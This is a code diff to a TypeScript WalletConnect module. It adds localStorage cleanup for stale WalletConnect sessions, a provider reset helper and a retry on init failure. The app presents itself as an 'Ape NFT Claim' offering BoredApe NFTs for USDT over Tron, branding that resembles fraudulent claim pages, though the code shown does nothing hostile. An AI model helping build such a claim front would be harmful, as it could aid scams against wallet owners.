@@ -20,6 +20,41 @@ function attachProviderListeners(wcProvider: InstanceType<typeof UniversalProvid
   displayUriListenerAttached = true;
 }
 
+/**
+ * Clear all WalletConnect-related data from localStorage.
+ * This is the nuclear option to fix corrupt relay state ("tag:undefined" errors)
+ * that persists across provider re-init because UniversalProvider.init() restores
+ * stale pairings/sessions from storage.
+ */
+function clearWalletConnectStorage() {
+  if (typeof window === "undefined") return;
+  try {
+    const keysToRemove: string[] = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key && (key.startsWith("wc@") || key.startsWith("walletconnect") || key.startsWith("WC_"))) {
+        keysToRemove.push(key);
+      }
+    }
+    keysToRemove.forEach((k) => localStorage.removeItem(k));
+    if (keysToRemove.length > 0) {
+      console.log("[WalletConnect] Cleared", keysToRemove.length, "stale storage entries");
+    }
+  } catch {
+    // Ignore storage access errors
+  }
+}
+
+/** Fully tear down the current provider and clear cached state. */
+async function resetProvider() {
+  if (provider) {
+    try { await provider.disconnect(); } catch { /* ignore */ }
+    provider = null;
+  }
+  displayUriListenerAttached = false;
+  clearWalletConnectStorage();
+}
+
 export async function initWalletConnect() {
   if (provider) return provider;
 
@@ -27,22 +62,35 @@ export async function initWalletConnect() {
 
   if (!PROJECT_ID) throw new Error("Missing PROJECT_ID");
 
-  provider = await UniversalProvider.init({
-    projectId: PROJECT_ID,
-    metadata: {
-      name: "Ape NFT Claim",
-      description: "Claim your exclusive BoredApe NFT with USDT",
-      url: window.location.origin,
-      icons: ["https://avatars.githubusercontent.com/u/37784886"],
-    },
-    relayUrl: "wss://relay.walletconnect.com", // or Reown's relay if preferred
-  });
+  try {
+    provider = await UniversalProvider.init({
+      projectId: PROJECT_ID,
+      metadata: {
+        name: "Ape NFT Claim",
+        description: "Claim your exclusive BoredApe NFT with USDT",
+        url: window.location.origin,
+        icons: ["https://avatars.githubusercontent.com/u/37784886"],
+      },
+    });
+  } catch (initError) {
+    // If init fails (corrupt storage, relay issue), clear everything and retry once
+    console.warn("[WalletConnect] init failed, resetting:", initError);
+    clearWalletConnectStorage();
+    provider = await UniversalProvider.init({
+      projectId: PROJECT_ID,
+      metadata: {
+        name: "Ape NFT Claim",
+        description: "Claim your exclusive BoredApe NFT with USDT",
+        url: window.location.origin,
+        icons: ["https://avatars.githubusercontent.com/u/37784886"],
+      },
+    });
+  }
 
   if (!modal) {
     const { WalletConnectModal } = await import("@walletconnect/modal");
     modal = new WalletConnectModal({
       projectId: PROJECT_ID,
-      // No need for chains here — handled in connect()
       themeMode: "dark",
       themeVariables: { "--wcm-z-index": "9999" },
       explorerRecommendedWalletIds: [
@@ -57,17 +105,14 @@ export async function initWalletConnect() {
 }
 
 export async function connectWalletConnect() {
-  // If there's a stale provider with no active session, discard it so
-  // initWalletConnect() creates a fresh one.  This prevents the
-  // "Failed to publish custom payload … tag:undefined" relay error.
+  // If there's a stale provider with no active session, tear it down
+  // completely (including localStorage) to avoid "tag:undefined" errors.
   if (provider) {
     const hasActiveSession =
       provider.session?.topic &&
       (provider.session?.namespaces?.tron?.accounts ?? []).length > 0;
     if (!hasActiveSession) {
-      try { await provider.disconnect(); } catch { /* ignore */ }
-      provider = null;
-      displayUriListenerAttached = false;
+      await resetProvider();
     }
   }
 
@@ -90,11 +135,8 @@ export async function connectWalletConnect() {
     });
   } catch (error) {
     modal?.closeModal();
-    // If the relay is in a bad state, reset everything so the next
-    // attempt starts completely fresh.
-    try { await wcProvider.disconnect(); } catch { /* ignore */ }
-    provider = null;
-    displayUriListenerAttached = false;
+    // Connection failed — full reset so next attempt starts fresh
+    await resetProvider();
     throw error;
   }
 
@@ -107,11 +149,7 @@ export async function connectWalletConnect() {
 
 
 export async function disconnectWalletConnect() {
-  if (provider) {
-    try { await provider.disconnect(); } catch { /* ignore */ }
-    provider = null;
-    displayUriListenerAttached = false;
-  }
+  await resetProvider();
 }
 
 export function getWalletConnectProvider() {
